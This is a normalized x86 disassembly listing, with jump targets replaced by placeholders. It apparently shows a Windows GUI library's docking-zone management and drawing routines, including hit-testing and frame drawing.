mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44f70c
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_44ee98
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_450738
mov edx esi
mov eax ebx
call sub_44f70c
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_446708
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ee74
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_4466f4
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_44eff8
mov edx eax
mov eax edi
call sub_44f3e8
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_44eff8
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_44eff8
mov edx eax
mov eax edi
call sub_44f3e8
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_44eff8
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44fa20
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44fbc8
jmp r-xdata
sub_44fa20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ee74
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_44f3c0
mov edx eax
mov eax ebx
call sub_44f3e8
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44f3e8
mov eax [ esi + 0x64 ]
call sub_44f3c0
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_450a90
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44f774
mov eax [ esi + 0x64 ]
call sub_44f3c0
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_450a90
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44f774
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_450e14
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44f774
mov eax [ esi + 0x64 ]
call sub_44f3c0
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_450f48
xor edx edx
mov eax esi
call sub_44f774
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44f3e8
adc edx 0x0
mov eax ebx
call sub_44f0a8
mov eax ebx
call sub_44f438
push esi
push sub_450f48
xor edx edx
mov eax esi
call sub_44f774
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_44fbc8
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_44f0a8
mov eax [ ebx + 0x14 ]
call sub_44f438
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_44fc40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_44f3c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44f3c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_44f3c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44ef8c
mov esi eax
mov edx 0x2
mov eax ebx
call sub_44ef8c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_44f3c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44f498
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44f4c0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f498
call sub_44fc40
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f4c0
call sub_44fc40
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_44eff8
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_44eff8
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_44fe6c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_449d84
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416eec
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ff00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44fe6c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44f4c0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44f70c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44f4c0
call sub_44fc40
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_44ff88
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403fe8
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404634
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_44ffd0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4501c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_4506a0
mov eax [ ebp - 0x8 ]
call sub_44f69c
xor edx edx
push ebp
push sub_4501ab
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4501b2
mov eax [ ebp - 0x8 ]
call sub_44f6a0
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ee74
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_44ff88
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_40346c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44f194
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_44ff88
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_446684
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_447458
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403270
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4501d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_416f14
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424b20
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450230
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423e04
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_424854
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_4247f4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4247f4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423e04
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_4247f4
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4247f4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4502b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4501d8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_450230
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_450230
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4501d8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_450230
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_450230
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_450394
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4504ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_445340
mov eax [ ebp - 0x4 ]
call sub_42482c
xor eax eax
push ebp
push sub_4504cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424ba0
xor eax eax
push ebp
push sub_4504b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_449d84
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504b7
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424ba0
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_446104
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4504f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44bb84
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4461ac
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_446168
mov ecx eax
xor edx edx
xor eax eax
call sub_416f14
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_44d054
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416f3c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_45066c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45066c
pop ecx
mov eax ebx
call sub_403270
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45066c
pop ecx
sub_4506a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_45066c
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403270
xor eax eax
mov [ esi + 0x64 ] eax
sub_4506fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f70c
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_450738
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450738
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4509a5
